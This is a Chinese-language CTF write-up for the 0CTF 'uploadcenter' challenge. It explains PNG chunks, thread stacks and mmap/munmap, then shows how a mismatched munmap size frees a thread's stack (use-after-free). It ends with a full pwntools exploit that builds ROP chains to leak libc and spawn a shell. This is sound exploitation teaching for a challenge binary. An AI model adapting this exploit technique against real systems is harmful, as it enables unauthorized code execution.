# 0CTF uploadcenter


一道做了许久的题目，涉及的知识挺多的。

<!--more-->

# 涉及知识

+ PNG文件结构
+ 线程互锁和消息
+ 线程栈的分配
+ mmap和munmap

在开始分析程序之前，先对涉及的知识做一个简单的介绍，也算是对知识的总结。

## PNG文件结构

PNG文件是由魔术和若干数据块构成的。

PNG的魔术为：

89 50 4E 47 0D 0A 1A 0A

数据块中最主要的数据块是IHDR，PLTE，IDAT，IEND。每个数据块又由一下四个部分构成，其中数据块类型码标记数块的类型，如IHDR数据块，这个字段就是‘IHDR’字符串，IDAT数据块，这个字段就是‘IDAT’字符串

| **名称**                       | **字节数** | **说明**                                           |
| ------------------------------ | ---------- | -------------------------------------------------- |
| Length (长度)                  | 4字节      | 指定数据块中数据域的长度，其长度不超过(231－1)字节 |
| Chunk Type Code (数据块类型码) | 4字节      | 数据块类型码由ASCII字母(A-Z和a-z)组成              |
| Chunk Data (数据块数据)        | 可变长度   | 存储按照Chunk Type Code指定的数据                  |
| CRC (循环冗余检测)             | 4字节      | 存储用来检测是否有错误的循环冗余码                 |

**IHDR**是文件头数据块，主要包含了PNG图片的一些基本信息，如图像宽度，图像高度，图像深度等。

| **域的名称**       | **字节数** | **说明**                                                     |
| ------------------ | ---------- | ------------------------------------------------------------ |
| Width              | 4 bytes    | 图像宽度，以像素为单位                                       |
| Height             | 4 bytes    | 图像高度，以像素为单位                                       |
| Bit depth          | 1 byte     | 图像深度： 索引彩色图像：1，2，4或8 灰度图像：1，2，4，8或16 真彩色图像：8或16 |
| Color Type         | 1 byte     | 颜色类型： 0：灰度图像, 1，2，4，8或16 2：真彩色图像，8或16 3：索引彩色图像，1，2，4或8 4：带α通道数据的灰度图像，8或16 6：带α通道数据的真彩色图像，8或16 |
| Compression method | 1 byte     | 压缩方法(LZ77派生算法)                                       |
| Filter method      | 1 byte     | 滤波器方法                                                   |
| Interlace method   | 1 byte     | 隔行扫描方法： 0：非隔行扫描 1： Adam7(由Adam M. Costello开发的7遍隔行扫描方法) |

**PLTE**是调色板数据块包含有与索引彩色图像相关的彩色变换数据，它仅仅与索引的彩色图像有关，而且需要放在IDAT之前。

**IDAT**是图像数据块，用于储存实际的数据。

**IEND**是图像结束数据，用于标记PNG数据流的结尾，该段必须放在文件的尾部。通常这个数据段没有数据，所以一般这个段的内容是：00 00 00 00 49 45 4E 44 AE 42 60 82。前四个自己是数据段长度，因为没有数据，所以为0，中间四个字节是‘IEND’，最后四个字节是CRC结果。

## 线程互锁和消息

当两个线程同时访问一个全局变量时，如果不用互锁就会发送问题，比如A线程和B线程都对变量C进行加1操作，理论上来说C最后应该加2，但是如果A和B线程对C同时操作的话，C的最后结果是未知的。为了解决这样的问题，我们给线程加上了一个互锁机制，当A线程访问C时将会请求对mutex（Mutual exclusion）加锁，而当B访问C时，同样会有加锁请求，但是其以及被A加锁了，所以只能等待其解锁后再操作。这里需要用到的两个函数分别是：pthread_mutex_lock() pthread_mutex_unlock()

线程的消息机制是指当一个线程对一个队列等数据结构操作时，发现队列里面没有数据，于是解锁mutex并进入休眠，当队列里面有数据时，唤醒线程，并对mutex加锁。与这个操作有关的函数是：pthread_cond_wait（） pthread_cond_signal（）

## 线程栈的分配

对于多线程的程序，每个线程都有自己独立的栈空间，栈空间的大小可以用ulimit -a来查询。为了防止栈溢出，在栈顶其还分配了一个0x1000大小的空间，该空间没有权限，所以如果栈的访问超过了栈空间大小，而访问了这个0x1000的空间，会发送段错误。

## mmap和munmap

mmap在分配时是向低字节生长的，这和heap分配的方式不同。并且mmap分配的空间当释放后会直接返回给操作系统，而不会像heap，会有bins管理机制。

# 程序分析

## 保护机制

![image-20200513182334383](https://i.loli.net/2020/05/20/kwBWnf7ljYAFqZv.png)

没有开启PIE，开启部分RELRO

## 漏洞分析

程序是一个上传gzip压缩的png图片，并用mmap的空间来储存。但是程序mmap的空间大小是由png图片IHDR数据块里面width和height数据来决定的，而munmap的大小是根据png数据块的大小来释放的。如果png数据块的大小大于width*height，那么将会多释放一些空间，如果这些空间有特殊用处的话，就存在UAF漏洞。

那么如何让图片后面的空间有用处呢？

我们继续看程序的功能，程序有个monitor_file（），其将会开启一个线程来监视是否有新的文件上传。

根据上面的知识介绍，我们知道线程的栈也是用mmap来分配的，那么如果我们让图片的数据和stack的空间相邻，是否就可以将栈的数据给free掉，再之后重新上传图片以覆盖栈内数据呢？

我们测试一下。这是没有开启monitor_file时内存的情况：

![image-20200513184808893](https://i.loli.net/2020/05/20/DhIGv19cs4yXzxM.png)

当我们调用monitor_file后：（由于不是一次调试的结果，所以可能地址不一样，但是主要是看大小的变化）

![image-20200513185018046](https://i.loli.net/2020/05/20/GVAKZr2IJh6xfS5.png)

可以看到第二个箭头对应的大小从1e00000变成了1600000，增加的大小刚好是800000即8MB，刚好是该系统规定的线程栈大小。第一个箭头的0x1000就是用来保护栈的，防止栈溢出超过8MB。

我们再上传一个图片：

![image-20200513185357531](https://i.loli.net/2020/05/20/atPHbrCEzjF7hZV.png)

我们上传了一个9MB大小的图片，但是width和height分别只有1024所以只分配了1MB的空间。我们再查看一下当前线程的栈地址：

![image-20200513185533839](https://i.loli.net/2020/05/20/a3R5wVnk1LMFO2J.png)

当前线程的rsp指向了0x7f4d93437f00如果我们想要利用该程序的漏洞，就需要将这一部分也给释放掉。我们计算一下rsp到图片地址的大小0x7f4d93437f00-0x7f4d92b38000=0x8fff00，如果图片的IDAT的数据为9MB超过了0x8fff00，所以该线程的栈会被我们释放掉。我们删除图片然后来观察一下内存情况：

![image-20200513192628766](https://i.loli.net/2020/05/20/H9cEMAyB1kGXfoT.png)

可以看到我们把线程的栈也给释放掉了。如此我们就可以修改线程栈的信息了（注意：这里之所以线程没有崩溃掉，是因为线程进入了等待消息的状态，也就是进入了休眠）。我们计算一下线程栈地址到mmap顶部的距离，计算得0x1100，同时我们是将png的全部内容复制到mmap的空间里，当我们计算rop链时，需要减掉png头部的信息。如此我们就可以写出exp。

# EXP

````python
from pwn import *
from LibcSearcher import *
import zlib
from struct import pack
if args['REMOTE']:
	sh=remote()
else:
	sh=process('./uploadcenter')

if args['I386']:
	context.arch='i386'
else:
	context.arch='amd64'

if args['DEBUG']:
	context.log_level='debug'
elf=ELF('./uploadcenter')
# gdb.attach(sh,'''
# c
# ''')
def choice(election):
	sh.recvuntil('6 :) Monitor File\n')
	sh.sendline(str(election))

def genPngEx(width,height,bit_depth,color_type,i_data,data_length):
	comprMethod=0
	filterMthod=0
	interlaceMehod=0
	#magic
	i_magic=pack('>Q',0x89504E470D0A1A0A)
	#IHDR
	ihdr='IHDR'+pack('>I',width)+pack('>I',height)+chr(bit_depth)+chr(color_type)+chr(comprMethod)+chr(filterMthod)+\
	chr(interlaceMehod)
	ihdr=p32(len(ihdr)-4)+ihdr+'AAAA'	
	#IDAT
	idat=p32(data_length)+'IDAT'+i_data+'AAAA'
	#IEND
	iend=p32(0)+'IEND'+'AAAA'

	return i_magic+ihdr+idat+iend

def genPng(width,height,data):
	data_length=len(data)
	return genPngEx(width,height,8,2,data,data_length)


def add_png(width,height,data):
	choice(2)
	png=zlib.compress(genPng(width,height,data))
	sh.send(p32(len(png)))
	sh.send(png)

def monitor_file():
	choice(6)

def delete_file(index):
	choice(4)
	sh.recvuntil('?\n')
	sh.sendline(str(index))

mutex=0x000000000060E160
cond=0x000000000060E1A0
rdi_ret=0x00000000004038b1
puts_plt=elf.plt['puts']
puts_got=elf.got['puts']
exit=elf.plt['exit']
mutex_unlock=elf.plt['pthread_mutex_unlock']
sleep=elf.plt['sleep']
def rop(ropchain,index):
	monitor_file()
	add_png(1024,1024,'A'*1024*1024*9)
	delete_file(index)
	payload='A'*(1024*1024-0x1100-0x29)
	payload+=p64(0)+p64(cond)+p64(mutex)+p64(0)+p64(0)
	payload+=ropchain
	payload=payload.ljust(0x100000,'\x00')
	add_png(1024,1024,payload)

ropchain=p64(rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(rdi_ret)+\
		 p64(mutex)+p64(mutex_unlock)+\
		 p64(rdi_ret)+p64(60)+p64(sleep)
rop(ropchain,0)
#leak libc
sh.recvuntil('data\n')
puts_addr=u64(sh.recvuntil('\n').replace('\n','').ljust(8,'\x00'))
print hex(puts_addr)
libc=LibcSearcher('puts',puts_addr)
libc_base=puts_addr-libc.dump('puts')
system=libc_base+libc.dump('system')
bin_sh=libc_base+libc.dump('str_bin_sh')
one_gadget=libc_base+0x4526a
#get shell
ropchain=p64(one_gadget)
rop(ropchain,1)
sh.interactive()
````

# 参考

[PNG文件结构](https://blog.csdn.net/bisword/article/details/2777121)

[线程互锁](https://www.ibm.com/developerworks/cn/linux/thread/posix_thread2/index.html)

[线程信号](https://www.ibm.com/developerworks/cn/linux/thread/posix_thread3/index.html)

[线程栈](https://blog.csdn.net/elfprincexu/article/details/78779158)

[mmap分配](http://tukan.farm/2016/07/27/munmap-madness/)

[Dragon sector](https://blog.dragonsector.pl/2017/03/0ctf-2017-uploadcenter-pwn-523.html)

[Tamás Koczka](https://kt.gy/blog/2017/03/0ctf-2017-quals-uploadcenter/)
